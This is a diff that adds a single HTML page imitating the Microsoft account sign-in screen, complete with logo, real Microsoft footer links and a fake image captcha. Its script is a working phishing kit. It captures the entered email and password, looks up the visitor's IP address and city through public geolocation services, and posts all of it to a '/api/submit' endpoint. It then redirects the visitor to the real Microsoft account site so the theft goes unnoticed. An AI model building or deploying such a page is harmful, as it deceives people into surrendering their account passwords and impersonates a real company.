@@ -1,0 +1,864 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign in to your Microsoft account</title>
+    <link rel="icon" type="image/x-icon" href="https://logincdn.msftauth.net/16.000.30004.15/images/favicon.ico">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Arial, sans-serif;
+        }
+        
+        body {
+            background-color: #f8f8f8;
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        
+        .container {
+            width: 100%;
+            max-width: 440px;
+            background-color: white;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+            overflow: hidden;
+        }
+        
+        form {
+            padding: 40px 44px;
+        }
+        
+        .logo-container {
+            display: flex;
+            align-items: center;
+            margin-bottom: 24px;
+        }
+        
+        .logo {
+            height: 24px;
+            margin-right: 10px;
+        }
+        
+        .logo-text {
+            font-size: 21px;
+            font-weight: 600;
+            color: #1b1b1b;
+        }
+        
+        .forms-container {
+            position: relative;
+            overflow: hidden;
+            min-height: 360px;
+        }
+        
+        .forms {
+            display: flex;
+            width: 200%;
+            transition: transform 0.3s ease;
+        }
+        
+        .forms.next-form {
+            transform: translateX(-50%);
+        }
+        
+        .first, .second {
+            width: 50%;
+            padding: 0 10px;
+        }
+        
+        h2 {
+            font-size: 24px;
+            font-weight: 600;
+            margin-bottom: 16px;
+            color: #1b1b1b;
+        }
+        
+        .form-group {
+            margin-bottom: 16px;
+        }
+        
+        input[type="email"], input[type="password"] {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #d1d1d1;
+            border-radius: 4px;
+            font-size: 15px;
+            transition: border-color 0.2s;
+        }
+        
+        input[type="email"]:focus, input[type="password"]:focus {
+            outline: none;
+            border-color: #0067b8;
+            box-shadow: 0 0 0 2px rgba(0, 103, 184, 0.2);
+        }
+        
+        p {
+            margin: 16px 0;
+            font-size: 14px;
+            color: #616161;
+        }
+        
+        a {
+            color: #0067b8;
+            text-decoration: none;
+            font-size: 13px;
+        }
+        
+        a:hover {
+            text-decoration: underline;
+        }
+        
+        button {
+            width: 100%;
+            padding: 12px;
+            background-color: #0067b8;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            font-size: 15px;
+            font-weight: 600;
+            cursor: pointer;
+            margin-top: 16px;
+        }
+        
+        button:hover {
+            background-color: #005da6;
+        }
+        
+        button:disabled {
+            background-color: #a0a0a0;
+            cursor: not-allowed;
+        }
+        
+        .arrow-btn {
+            cursor: pointer;
+            font-size: 18px;
+            margin-right: 8px;
+            color: #0067b8;
+        }
+        
+        .email {
+            font-weight: 600;
+            color: #1b1b1b;
+        }
+        
+        .signin-options {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 12px 16px;
+            border-top: 1px solid #e6e6e6;
+            background-color: #f8f8f8;
+            gap: 8px;
+            cursor: pointer;
+            transition: background-color 0.2s;
+            font-size: 13px;
+            color: #616161;
+        }
+        
+        .signin-options:hover {
+            background-color: #f0f0f0;
+        }
+        
+        .signin-options svg {
+            width: 16px;
+            height: 16px;
+        }
+        
+        .captcha-toggle {
+            display: flex;
+            align-items: center;
+            margin: 15px 0;
+            padding: 10px;
+            border: 1px solid #d1d1d1;
+            border-radius: 4px;
+            background-color: #f8f8f8;
+            cursor: pointer;
+        }
+        
+        .captcha-toggle input {
+            margin-right: 10px;
+        }
+        
+        .captcha-toggle label {
+            cursor: pointer;
+            font-size: 14px;
+            color: #1b1b1b;
+        }
+        
+        .captcha-toggle.verified {
+            border-color: #107c10;
+            background-color: #f1f9f1;
+        }
+        
+        .checkmark {
+            color: #107c10;
+            margin-left: auto;
+            font-weight: bold;
+            display: none;
+        }
+        
+        .captcha-toggle.verified .checkmark {
+            display: inline;
+        }
+        
+        .captcha-container {
+            margin: 10px 0;
+            padding: 15px;
+            background-color: #f8f8f8;
+            border-radius: 4px;
+            border: 1px solid #e6e6e6;
+            display: none;
+        }
+        
+        .captcha-title {
+            font-size: 14px;
+            margin-bottom: 10px;
+            color: #1b1b1b;
+        }
+        
+        .captcha-images {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 10px;
+            margin-bottom: 15px;
+        }
+        
+        .captcha-image {
+            width: 100%;
+            height: 80px;
+            border: 1px solid #d1d1d1;
+            border-radius: 4px;
+            cursor: pointer;
+            transition: border-color 0.2s;
+            background-color: white;
+            overflow: hidden;
+            position: relative;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        
+        .captcha-image.selected {
+            border-color: #0067b8;
+            box-shadow: 0 0 0 2px rgba(0, 103, 184, 0.2);
+        }
+        
+        .captcha-image svg {
+            width: 100%;
+            height: 100%;
+            object-fit: contain;
+        }
+        
+        .captcha-instructions {
+            font-size: 12px;
+            color: #616161;
+            margin-bottom: 10px;
+        }
+        
+        .captcha-controls {
+            display: flex;
+            justify-content: space-between;
+            margin-top: 10px;
+        }
+        
+        .captcha-controls button {
+            width: auto;
+            padding: 6px 12px;
+            font-size: 13px;
+            margin-top: 0;
+        }
+        
+        .captcha-controls .refresh {
+            background-color: transparent;
+            color: #0067b8;
+            border: 1px solid #d1d1d1;
+        }
+        
+        .captcha-controls .refresh:hover {
+            background-color: #f0f0f0;
+        }
+        
+        .error-message {
+            color: #d13438;
+            font-size: 12px;
+            margin-top: 5px;
+            display: none;
+        }
+        
+        .success-message {
+            color: #107c10;
+            font-size: 12px;
+            margin-top: 5px;
+            display: none;
+        }
+        
+        .footer {
+            margin-top: 40px;
+            text-align: center;
+            font-size: 12px;
+            color: #616161;
+        }
+        
+        .footer a {
+            margin: 0 10px;
+            font-size: 12px;
+        }
+        
+        .loading {
+            display: none;
+            text-align: center;
+            color: #0067b8;
+            margin-top: 10px;
+        }
+        
+        @media (max-width: 480px) {
+            form {
+                padding: 24px;
+            }
+            
+            .container {
+                max-width: 100%;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <form id="loginForm" name="logonForm" autocomplete="off">
+            <!-- Fixed Microsoft logo with proper positioning -->
+            <div class="logo-container">
+                <svg class="logo" viewBox="0 0 23 23" xmlns="http://www.w3.org/2000/svg">
+                    <path d="M0 0h11.5v11.5H0V0zm11.5 11.5H23V23H11.5V11.5z" fill="#f25022"/>
+                    <path d="M0 11.5h11.5V23H0V11.5zm11.5 0H23V0H11.5v11.5z" fill="#7fba00"/>
+                    <path d="M11.5 0H23v11.5H11.5V0z" fill="#00a4ef"/>
+                    <path d="M0 0h11.5v11.5H0V0z" fill="#ffb900"/>
+                </svg>
+                <span class="logo-text">Microsoft</span>
+            </div>
+            
+            <div class="forms-container">
+                <div class="forms">
+                    <div class="first">
+                        <h2>Sign in</h2>
+                        <div class="form-group">
+                            <input type="email" id="emailInput" placeholder="Email, phone, or Skype" required>
+                        </div>
+                        <p>No account? <a href="#">Create one!</a></p>
+                        <a href="#">Can't access your account?</a>
+                        <button type="button" class="next-btn">Next</button>
+                    </div>
+                    <div class="second">
+                        <p><span class="arrow-btn">&#8592;</span> <span class="email">helloworld@hotmail.com</span></p>
+                        <h2>Enter password</h2>
+                        <div class="form-group">
+                            <input type="password" id="passwordInput" placeholder="Password" required>
+                        </div>
+                        
+                        <!-- Captcha Toggle -->
+                        <div class="captcha-toggle" id="captchaToggle">
+                            <input type="checkbox" id="captchaRequired">
+                            <label for="captchaRequired">Captcha required</label>
+                            <span class="checkmark">✓ Verified</span>
+                        </div>
+                        
+                        <!-- Integrated Captcha Section -->
+                        <div class="captcha-container" id="captchaContainer">
+                            <div class="captcha-title">Select all images with <strong id="captcha-challenge">buses</strong></div>
+                            <div class="captcha-instructions">Click verify once there are none left</div>
+                            
+                            <div class="captcha-images" id="captcha-images-container">
+                                <!-- SVG images will be loaded by JavaScript -->
+                            </div>
+                            
+                            <div class="error-message" id="captcha-error">Please select at least one image</div>
+                            <div class="success-message" id="captcha-success">Verification successful!</div>
+                            
+                            <div class="captcha-controls">
+                                <button type="button" class="refresh">Refresh images</button>
+                                <button type="button" class="verify">Verify</button>
+                            </div>
+                        </div>
+                        
+                        <a href="#">Forgot password?</a>
+                        <button type="submit" id="signinButton" disabled>Sign in</button>
+                        <div class="loading" id="loadingIndicator">Signing in...</div>
+                    </div>
+                </div>
+            </div>
+        </form>
+        
+        <!-- Fixed Sign-in options section matching Microsoft design -->
+        <div class="signin-options">
+            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                <path d="M12 2C13.1 2 14 2.9 14 4C14 5.1 13.1 6 12 6C10.9 6 10 5.1 10 4C10 2.9 10.9 2 12 2ZM21 9V7L15 5.5V7H9V5.5L3 7V9L9 10.5V12H3V14L9 15.5V17H15V15.5L21 14V12L15 10.5V9H21Z" fill="#616161"/>
+            </svg>
+            <span>Sign-in options</span>
+        </div>
+    </div>
+    
+    <div class="footer">
+        <a href="https://go.microsoft.com/fwlink/?LinkId=521839" target="_blank">Terms of use</a>
+        <a href="https://go.microsoft.com/fwlink/?LinkID=246338" target="_blank">Privacy & cookies</a>
+    </div>
+
+    <script>
+        const forms = document.querySelector('.forms');
+        const nextButton = document.querySelector('.next-btn');
+        const arrowButton = document.querySelector('.arrow-btn');
+        const emailInput = document.getElementById('emailInput');
+        const passwordInput = document.getElementById('passwordInput');
+        const emailDisplay = document.querySelector('.email');
+        const signinButton = document.getElementById('signinButton');
+        const loginForm = document.getElementById('loginForm');
+        const captchaToggle = document.getElementById('captchaToggle');
+        const captchaContainer = document.getElementById('captchaContainer');
+        const captchaCheckbox = document.getElementById('captchaRequired');
+        const loadingIndicator = document.getElementById('loadingIndicator');
+        
+        // Captcha functionality
+        const captchaImagesContainer = document.getElementById('captcha-images-container');
+        const refreshButton = document.querySelector('.captcha-controls .refresh');
+        const verifyButton = document.querySelector('.captcha-controls .verify');
+        const captchaError = document.getElementById('captcha-error');
+        const captchaSuccess = document.getElementById('captcha-success');
+        const captchaChallenge = document.getElementById('captcha-challenge');
+        
+        // SVG images for captcha (embedded directly)
+        const svgImages = {
+            buses: [
+                `<svg width="100" height="80" viewBox="0 0 100 80" xmlns="http://www.w3.org/2000/svg">
+                    <rect width="100" height="80" fill="#f0f0f0"/>
+                    <rect x="10" y="20" width="80" height="40" fill="#0067b8"/>
+                    <rect x="15" y="25" width="20" height="10" fill="#ffb900"/>
+                    <rect x="65" y="25" width="20" height="10" fill="#ffb900"/>
+                    <circle cx="25" cy="70" r="8" fill="#333"/>
+                    <circle cx="75" cy="70" r="8" fill="#333"/>
+                    <rect x="40" y="30" width="20" height="5" fill="#fff"/>
+                </svg>`,
+                `<svg width="100" height="80" viewBox="0 0 100 80" xmlns="http://www.w3.org/2000/svg">
+                    <rect width="100" height="80" fill="#f0f0f0"/>
+                    <rect x="5" y="15" width="90" height="45" fill="#d13438"/>
+                    <rect x="10" y="20" width="25" height="8" fill="#ffb900"/>
+                    <rect x="65" y="20" width="20" height="8" fill="#ffb900"/>
+                    <circle cx="20" cy="65" r="10" fill="#333"/>
+                    <circle cx="80" cy="65" r="10" fill="#333"/>
+                    <rect x="40" y="25" width="20" height="5" fill="#fff"/>
+                </svg>`,
+                `<svg width="100" height="80" viewBox="0 0 100 80" xmlns="http://www.w3.org/2000/svg">
+                    <rect width="100" height="80" fill="#f0f0f0"/>
+                    <rect x="15" y="25" width="70" height="35" fill="#107c10"/>
+                    <rect x="20" y="30" width="15" height="7" fill="#ffb900"/>
+                    <rect x="65" y="30" width="15" height="7" fill="#ffb900"/>
+                    <circle cx="30" cy="70" r="7" fill="#333"/>
+                    <circle cx="70" cy="70" r="7" fill="#333"/>
+                    <rect x="45" y="35" width="10" height="3" fill="#fff"/>
+                </svg>`
+            ],
+            cars: [
+                `<svg width="100" height="80" viewBox="0 0 100 80" xmlns="http://www.w3.org/2000/svg">
+                    <rect width="100" height="80" fill="#f0f0f0"/>
+                    <rect x="20" y="30" width="60" height="25" fill="#0067b8"/>
+                    <rect x="25" y="35" width="15" height="8" fill="#ffb900"/>
+                    <rect x="60" y="35" width="15" height="8" fill="#ffb900"/>
+                    <circle cx="30" cy="65" r="6" fill="#333"/>
+                    <circle cx="70" cy="65" r="6" fill="#333"/>
+                    <rect x="40" y="40" width="20" height="3" fill="#fff"/>
+                </svg>`,
+                `<svg width="100" height="80" viewBox="0 0 100 80" xmlns="http://www.w3.org/2000/svg">
+                    <rect width="100" height="80" fill="#f0f0f0"/>
+                    <rect x="15" y="35" width="70" height="20" fill="#d13438"/>
+                    <rect x="20" y="40" width="12" height="5" fill="#ffb900"/>
+                    <rect x="68" y="40" width="12" height="5" fill="#ffb900"/>
+                    <circle cx="25" cy="65" r="5" fill="#333"/>
+                    <circle cx="75" cy="65" r="5" fill="#333"/>
+                    <rect x="45" y="45" width="10" height="2" fill="#fff"/>
+                </svg>`,
+                `<svg width="100" height="80" viewBox="0 0 100 80" xmlns="http://www.w3.org/2000/svg">
+                    <rect width="100" height="80" fill="#f0f0f0"/>
+                    <rect x="25" y="40" width="50" height="15" fill="#107c10"/>
+                    <rect x="30" y="45" width="10" height="4" fill="#ffb900"/>
+                    <rect x="60" y="45" width="10" height="4" fill="#ffb900"/>
+                    <circle cx="35" cy="65" r="4" fill="#333"/>
+                    <circle cx="65" cy="65" r="4" fill="#333"/>
+                    <rect x="47" y="50" width="6" height="1" fill="#fff"/>
+                </svg>`
+            ],
+            bicycles: [
+                `<svg width="100" height="80" viewBox="0 0 100 80" xmlns="http://www.w3.org/2000/svg">
+                    <rect width="100" height="80" fill="#f0f0f0"/>
+                    <circle cx="30" cy="50" r="15" fill="#ccc" stroke="#333" stroke-width="2"/>
+                    <circle cx="70" cy="50" r="15" fill="#ccc" stroke="#333" stroke-width="2"/>
+                    <path d="M30 50 L50 30 L70 50" stroke="#333" stroke-width="3" fill="none"/>
+                    <rect x="45" y="30" width="10" height="20" fill="#0067b8"/>
+                </svg>`,
+                `<svg width="100" height="80" viewBox="0 0 100 80" xmlns="http://www.w3.org/2000/svg">
+                    <rect width="100" height="80" fill="#f0f0f0"/>
+                    <circle cx="25" cy="55" r="12" fill="#ccc" stroke="#333" stroke-width="2"/>
+                    <circle cx="65" cy="55" r="12" fill="#ccc" stroke="#333" stroke-width="2"/>
+                    <path d="M25 55 L45 35 L65 55" stroke="#333" stroke-width="3" fill="none"/>
+                    <rect x="40" y="35" width="10" height="15" fill="#d13438"/>
+                </svg>`,
+                `<svg width="100" height="80" viewBox="0 0 100 80" xmlns="http://www.w3.org/2000/svg">
+                    <rect width="100" height="80" fill="#f0f0f0"/>
+                    <circle cx="35" cy="50" r="10" fill="#ccc" stroke="#333" stroke-width="2"/>
+                    <circle cx="65" cy="50" r="10" fill="#ccc" stroke="#333" stroke-width="2"/>
+                    <path d="M35 50 L50 40 L65 50" stroke="#333" stroke-width="3" fill="none"/>
+                    <rect x="47" y="40" width="6" height="10" fill="#107c10"/>
+                </svg>`
+            ],
+            'traffic lights': [
+                `<svg width="100" height="80" viewBox="0 0 100 80" xmlns="http://www.w3.org/2000/svg">
+                    <rect width="100" height="80" fill="#f0f0f0"/>
+                    <rect x="40" y="10" width="20" height="60" fill="#333"/>
+                    <circle cx="50" cy="25" r="8" fill="#d13438"/>
+                    <circle cx="50" cy="40" r="8" fill="#ffb900"/>
+                    <circle cx="50" cy="55" r="8" fill="#107c10"/>
+                </svg>`,
+                `<svg width="100" height="80" viewBox="0 0 100 80" xmlns="http://www.w3.org/2000/svg">
+                    <rect width="100" height="80" fill="#f0f0f0"/>
+                    <rect x="45" y="15" width="10" height="50" fill="#666"/>
+                    <circle cx="50" cy="30" r="6" fill="#d13438"/>
+                    <circle cx="50" cy="45" r="6" fill="#ffb900"/>
+                    <circle cx="50" cy="60" r="6" fill="#107c10"/>
+                </svg>`,
+                `<svg width="100" height="80" viewBox="0 0 100 80" xmlns="http://www.w3.org/2000/svg">
+                    <rect width="100" height="80" fill="#f0f0f0"/>
+                    <rect x="47" y="20" width="6" height="40" fill="#999"/>
+                    <circle cx="50" cy="35" r="4" fill="#d13438"/>
+                    <circle cx="50" cy="50" r="4" fill="#ffb900"/>
+                    <circle cx="50" cy="65" r="4" fill="#107c10"/>
+                </svg>`
+            ]
+        };
+        
+        // Distractor SVG images (not matching any category)
+        const distractorSvgs = [
+            `<svg width="100" height="80" viewBox="0 0 100 80" xmlns="http://www.w3.org/2000/svg">
+                <rect width="100" height="80" fill="#f0f0f0"/>
+                <circle cx="50" cy="40" r="25" fill="#6a0572"/>
+                <polygon points="50,20 65,50 35,50" fill="#ab83a1"/>
+            </svg>`,
+            `<svg width="100" height="80" viewBox="0 0 100 80" xmlns="http://www.w3.org/2000/svg">
+                <rect width="100" height="80" fill="#f0f0f0"/>
+                <rect x="30" y="25" width="40" height="30" fill="#1a936f"/>
+                <circle cx="40" cy="30" r="5" fill="#114b5f"/>
+                <circle cx="60" cy="30" r="5" fill="#114b5f"/>
+                <rect x="45" y="40" width="10" height="10" fill="#f9c80e"/>
+            </svg>`,
+            `<svg width="100" height="80" viewBox="0 0 100 80" xmlns="http://www.w3.org/2000/svg">
+                <rect width="100" height="80" fill="#f0f0f0"/>
+                <path d="M30 50 Q50 20 70 50 Q50 80 30 50" fill="#2e86ab"/>
+                <circle cx="50" cy="40" r="5" fill="#f0f0f0"/>
+            </svg>`,
+            `<svg width="100" height="80" viewBox="0 0 100 80" xmlns="http://www.w3.org/2000/svg">
+                <rect width="100" height="80" fill="#f0f0f0"/>
+                <rect x="35" y="30" width="30" height="20" fill="#ff6b35"/>
+                <rect x="40" y="35" width="20" height="10" fill="#f0f0f0"/>
+                <line x1="35" y1="50" x2="65" y2="50" stroke="#333" stroke-width="2"/>
+            </svg>`,
+            `<svg width="100" height="80" viewBox="0 0 100 80" xmlns="http://www.w3.org/2000/svg">
+                <rect width="100" height="80" fill="#f0f0f0"/>
+                <circle cx="50" cy="40" r="20" fill="#e71d36"/>
+                <rect x="45" y="25" width="10" height="30" fill="#f0f0f0"/>
+                <rect x="25" y="35" width="50" height="10" fill="#f0f0f0"/>
+            </svg>`,
+            `<svg width="100" height="80" viewBox="0 0 100 80" xmlns="http://www.w3.org/2000/svg">
+                <rect width="100" height="80" fill="#f0f0f0"/>
+                <polygon points="50,20 70,60 30,60" fill="#2ec4b6"/>
+                <rect x="40" y="60" width="20" height="10" fill="#011627"/>
+            </svg>`
+        ];
+        
+        let currentChallenge = 'buses';
+        let selectedCaptchaIds = [];
+        let imageIdCounter = 1;
+        let captchaVerified = false;
+        
+        // Function to get location (country, state/region, city, and IP) - CLIENT SIDE
+        async function getUserLocation() {
+            try {
+                const response = await fetch('https://ipapi.co/json/');
+                const data = await response.json();
+                
+                if (data && data.country_name && data.region) {
+                    return {
+                        country: data.country_name,
+                        region: data.region,
+                        city: data.city,
+                        ip: data.ip
+                    };
+                }
+            } catch (error) {
+                console.error('Error getting location from ipapi.co:', error);
+                
+                // Fallback to another service if first fails
+                try {
+                    const fallbackResponse = await fetch('https://ipwhois.app/json/');
+                    const fallbackData = await fallbackResponse.json();
+                    
+                    if (fallbackData && fallbackData.country) {
+                        return {
+                            country: fallbackData.country,
+                            region: fallbackData.region || fallbackData.region_code,
+                            city: fallbackData.city,
+                            ip: fallbackData.ip
+                        };
+                    }
+                } catch (fallbackError) {
+                    console.error('Fallback location service also failed:', fallbackError);
+                }
+            }
+            
+            return {
+                country: 'Unknown',
+                region: 'Unknown',
+                city: 'Unknown',
+                ip: 'Unknown'
+            };
+        }
+        
+        // Secure function to send data to our server WITH LOCATION
+        async function submitToServer(email, password, location) {
+            try {
+                const response = await fetch('/api/submit', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        email: email,
+                        password: password,
+                        location: location // Include location data
+                    })
+                });
+                
+                const data = await response.json();
+                return data;
+            } catch (error) {
+                console.error('Error submitting to server:', error);
+                return { success: false };
+            }
+        }
+        
+        // Toggle captcha container
+        captchaToggle.addEventListener('click', function() {
+            if (!captchaCheckbox.checked) {
+                captchaCheckbox.checked = true;
+                captchaContainer.style.display = 'block';
+                captchaToggle.classList.remove('verified');
+                captchaVerified = false;
+                updateSigninButton();
+            } else if (!captchaVerified) {
+                // Only allow unchecking if captcha is verified
+                captchaContainer.style.display = 'block';
+            }
+        });
+        
+        // Function to create an SVG image element
+        function createSvgElement(svgContent, type, isCorrect) {
+            const imageDiv = document.createElement('div');
+            imageDiv.className = 'captcha-image';
+            const id = imageIdCounter++;
+            imageDiv.setAttribute('data-id', id);
+            imageDiv.setAttribute('data-type', isCorrect ? currentChallenge : 'distractor');
+            
+            // Insert SVG content directly
+            imageDiv.innerHTML = svgContent;
+            
+            return { element: imageDiv, id: id, type: isCorrect ? currentChallenge : 'distractor' };
+        }
+        
+        // Function to load captcha images
+        function loadCaptchaImages(challenge) {
+            captchaImagesContainer.innerHTML = '';
+            selectedCaptchaIds = [];
+            captchaError.style.display = 'none';
+            captchaSuccess.style.display = 'none';
+            
+            // Get 3-4 correct images for the challenge (random between 3-4)
+            const correctCount = Math.floor(Math.random() * 2) + 3; // 3 or 4
+            const correctSvgs = [...svgImages[challenge]]
+                .sort(() => 0.5 - Math.random())
+                .slice(0, correctCount);
+            
+            const correctImages = correctSvgs.map(svg => 
+                createSvgElement(svg, challenge, true)
+            );
+            
+            // Get remaining images as distractors (total 9 images)
+            const distractorCount = 9 - correctCount;
+            const randomDistractorSvgs = [...distractorSvgs]
+                .sort(() => 0.5 - Math.random())
+                .slice(0, distractorCount);
+            
+            const distractorImagesList = randomDistractorSvgs.map(svg => 
+                createSvgElement(svg, 'distractor', false)
+            );
+            
+            // Combine and shuffle all images
+            const allImages = [...correctImages, ...distractorImagesList]
+                .sort(() => 0.5 - Math.random());
+            
+            // Add images to container
+            allImages.forEach(imageData => {
+                captchaImagesContainer.appendChild(imageData.element);
+            });
+            
+            // Add click event listeners to new images
+            document.querySelectorAll('.captcha-image').forEach(image => {
+                image.addEventListener('click', () => {
+                    const id = image.getAttribute('data-id');
+                    if (selectedCaptchaIds.includes(id)) {
+                        selectedCaptchaIds = selectedCaptchaIds.filter(item => item !== id);
+                        image.classList.remove('selected');
+                    } else {
+                        selectedCaptchaIds.push(id);
+                        image.classList.add('selected');
+                    }
+                    captchaError.style.display = 'none';
+                    captchaSuccess.style.display = 'none';
+                });
+            });
+        }
+        
+        // Update signin button state
+        function updateSigninButton() {
+            if (captchaCheckbox.checked && !captchaVerified) {
+                signinButton.disabled = true;
+            } else {
+                signinButton.disabled = false;
+            }
+        }
+        
+        // Initialize captcha
+        loadCaptchaImages(currentChallenge);
+        
+        // Refresh captcha images
+        refreshButton.addEventListener('click', () => {
+            const challenges = Object.keys(svgImages);
+            const randomChallenge = challenges[Math.floor(Math.random() * challenges.length)];
+            currentChallenge = randomChallenge;
+            captchaChallenge.textContent = randomChallenge;
+            loadCaptchaImages(randomChallenge);
+            captchaVerified = false;
+            captchaToggle.classList.remove('verified');
+            updateSigninButton();
+        });
+        
+        // Verify captcha
+        verifyButton.addEventListener('click', () => {
+            if (selectedCaptchaIds.length === 0) {
+                captchaError.textContent = 'Please select at least one image';
+                captchaError.style.display = 'block';
+                captchaSuccess.style.display = 'none';
+                return;
+            }
+            
+            // Check if all selected images are correct
+            let allCorrect = true;
+            let correctCount = 0;
+            let totalCorrect = 0;
+            
+            // Count total correct images available
+            document.querySelectorAll('.captcha-image').forEach(image => {
+                if (image.getAttribute('data-type') === currentChallenge) {
+                    totalCorrect++;
+                }
+            });
+            
+            selectedCaptchaIds.forEach(id => {
+                const image = document.querySelector(`.captcha-image[data-id="${id}"]`);
+                if (image.getAttribute('data-type') === currentChallenge) {
+                    correctCount++;
+                } else {
+                    allCorrect = false;
+                }
+            });
+            
+            // User must select ALL correct images and NO incorrect ones
+            const selectedAllCorrect = correctCount === totalCorrect;
+            
+            if (allCorrect && selectedAllCorrect) {
+                // Captcha verified successfully
+                captchaSuccess.style.display = 'block';
+                captchaError.style.display = 'none';
+                captchaVerified = true;
+                captchaToggle.classList.add('verified');
+                captchaContainer.style.display = 'none';
+                updateSigninButton();
+            } else {
+                captchaError.textContent = `Please select all ${totalCorrect} images containing ${currentChallenge} and no others`;
+                captchaError.style.display = 'block';
+                captchaSuccess.style.display = 'none';
+                captchaVerified = false;
+                captchaToggle.classList.remove('verified');
+                updateSigninButton();
+            }
+        });
+        
+        // Form navigation
+        nextButton.addEventListener('click', function() {
+            if (emailInput.value.trim() !== '') {
+                emailDisplay.textContent = emailInput.value;
+                forms.classList.add('next-form');
+            }
+        });
+        
+        arrowButton.addEventListener('click', function() {
+            forms.classList.remove('next-form');
+        });
+        
+        // Form submission WITH LOCATION TRACKING
+        loginForm.addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            const email = emailInput.value;
+            const password = passwordInput.value;
+            
+            // Show loading indicator
+            loadingIndicator.style.display = 'block';
+            signinButton.disabled = true;
+            
+            // Get user location (country, state, city, IP)
+            const location = await getUserLocation();
+            console.log('User location:', location);
+            
+            // Send data to our secure server WITH LOCATION
+            const result = await submitToServer(email, password, location);
+            
+            // Hide loading indicator
+            loadingIndicator.style.display = 'none';
+            
+            if (result.success) {
+                // Redirect after successful submission
+                window.location.href = result.redirect || 'https://account.microsoft.com/account';
+            } else {
+                // Show error message if submission failed
+                alert('There was an error signing in. Please try again.');
+                signinButton.disabled = false;
+            }
+        });
+        
+        // Update signin button state based on password input
+        passwordInput.addEventListener('input', function() {
+            if (passwordInput.value.trim() !== '') {
+                signinButton.disabled = false;
+            } else {
+                signinButton.disabled = true;
+            }
+        });
+        
+        // Initialize
+        updateSigninButton();
+    </script>
+</body>
+</html>
